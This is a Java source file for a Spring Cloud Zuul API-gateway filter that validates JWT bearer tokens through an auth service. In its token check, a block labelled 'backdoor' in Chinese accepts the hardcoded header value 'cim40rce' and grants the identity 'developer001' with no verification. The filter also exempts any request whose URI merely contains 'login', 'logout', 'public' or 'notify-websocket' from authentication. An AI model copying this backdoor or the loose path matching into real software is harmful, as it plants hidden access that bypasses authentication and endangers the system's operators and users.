package com.cimforce.apigateway.filter;

import javax.security.sasl.AuthenticationException;
import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cloud.netflix.zuul.filters.support.FilterConstants;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Component;
import org.springframework.util.StringUtils;

import com.cimforce.apigateway.feign.AuthServiceAPI;
import com.cimforce.apigateway.model.dto.UserDTO;
import com.netflix.zuul.ZuulFilter;
import com.netflix.zuul.context.RequestContext;
import com.netflix.zuul.exception.ZuulException;

/**
 * 處理驗證權限的過濾器，判斷是否有登入
 * 所有的ZuulFilter共享一個RequestContext物件(該物件作為儲存整個請求的一些數據，將各filter執行結果放在該物件)
 * 
 * @author charles.chen
 * @date 2018年3月22日 上午10:49:34
 */
@Component
public class AccessFilter extends ZuulFilter {
   private static Logger log = LoggerFactory.getLogger(AccessFilter.class);

   private final static String AUTHORIZATION_HEADER = "Authorization";

   @Autowired
   AuthServiceAPI authServiceAPI;

   /**
    * filter執行的順序，通過數字指定，數字越小，越先執行
    * 
    * @author charles.chen
    * @date 2018年3月22日 上午10:49:34
    * @return int
    */
   @Override
   public int filterOrder() {
      return 1;
   }

   /**
    * filter執行類型，分以下類型 pre:請求執行之前的filter route: 處理請求，進行路由 post: 請求處理完成後執行的filter
    * error: 出現錯誤時執行的filter
    * 
    * @author charles.chen
    * @date 2018年3月22日 上午10:49:34
    * @return String
    */
   @Override
   public String filterType() {
      return FilterConstants.PRE_TYPE;
   }

   /**
    * filter是否許要執行 true:執行, false:不執行 對所有請求都會生效，可以利用該函數指定過濾器的有效範圍
    * 
    * @author charles.chen
    * @date 2018年3月22日 上午10:49:34
    * @return boolean
    */
   @Override
   public boolean shouldFilter() {
      return true;
   }

   /**
    * filter的具體邏輯
    * 
    * @author charles.chen
    * @date 2018年3月22日 上午10:49:34
    * @return Object
    */
   @Override
   public Object run() throws ZuulException {
      // RequestContext 在不同组件傳遞數據都是通過RequestContext來實現的
      RequestContext cxt = RequestContext.getCurrentContext();
      HttpServletRequest request = cxt.getRequest();

      // log.info("from {}:{}, locale: {}", request.getServerName(),
      // request.getServerPort(), request.getLocale());
      log.info("send {} request to {}, queryString:{}", request.getMethod(), request.getRequestURI().toString(), request.getQueryString());
      // 登入、登出、包含public的請求，不需要檢查header中的token，其餘皆需要驗證token
      if (request.getRequestURI().contains("login") || request.getRequestURI().contains("logout") || request.getRequestURI().contains("public")
            || request.getRequestURI().contains("notify-websocket")) {
         log.info("into api-gateway, {}", request.getRequestURI());
         if (request.getRequestURI().contains("notify-websocket")) {
            String upgradeHeader = request.getHeader("Upgrade");
            if (null == upgradeHeader) {
               upgradeHeader = request.getHeader("upgrade");
            }
            if (null != upgradeHeader && "websocket".equalsIgnoreCase(upgradeHeader)) {
               cxt.addZuulRequestHeader("connection", "Upgrade");
               return null;
            }
            return null;
         }
         return null;
      }

      try {
         // 1. 取得請求中標頭的token(key:Authorization)
         String bearerToken = request.getHeader(AUTHORIZATION_HEADER);

         if (bearerToken == null || bearerToken.isEmpty()) {
            throw new AuthenticationException("token is empty.");
         }

         // 後門
         if (bearerToken.equals("cim40rce")) {
            cxt.addZuulRequestHeader("userId", "developer001");
            cxt.addZuulRequestHeader("username", "developer001");
            return null;
         }

         String jwt = null;
         // 2. token字串中包含Bearer，移除移除Bearer
         if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            jwt = bearerToken.substring(7, bearerToken.length());
         }

         // 3. 檢查該jwt的合法性，並取得合法token中的會員資訊，在header中添加
         try {
            // Boolean isAuthenticationSuccess =
            // authServiceAPI.authenticationToken(jwt);
            UserDTO userDTO = authServiceAPI.getUser(jwt);
            // 在header添加token及userName訊息，給後續微服務使用
            cxt.addZuulRequestHeader("jwt", jwt);
            cxt.addZuulRequestHeader("userId", userDTO.getUsername());
            cxt.addZuulRequestHeader("username", userDTO.getUsername());
         } catch (Exception e) {
            throw new AuthenticationException("authorize failed.");
         }
      } catch (AuthenticationException e) {
         setFailedRequest(e.getMessage(), HttpStatus.UNAUTHORIZED.value()); // 401
         // cxt.setSendZuulResponse(false);
         // cxt.setResponseStatusCode(HttpStatus.UNAUTHORIZED.value());
         // cxt.addZuulResponseHeader("content-type","text/html;charset=utf-8");
         // cxt.setResponseBody(e.getMessage());
      }
      return null;
   }

   /**
    * 網關拋出異常
    * 
    * @author charles.chen
    * @date 2018年5月17日 下午2:50:27
    */
   private void setFailedRequest(String body, int httpCode) {
      log.debug("Reporting error ({}): {}", httpCode, body);
      RequestContext ctx = RequestContext.getCurrentContext();
      ctx.setResponseStatusCode(httpCode);
      ctx.setResponseBody(body);
      ctx.setSendZuulResponse(false);
   }
}
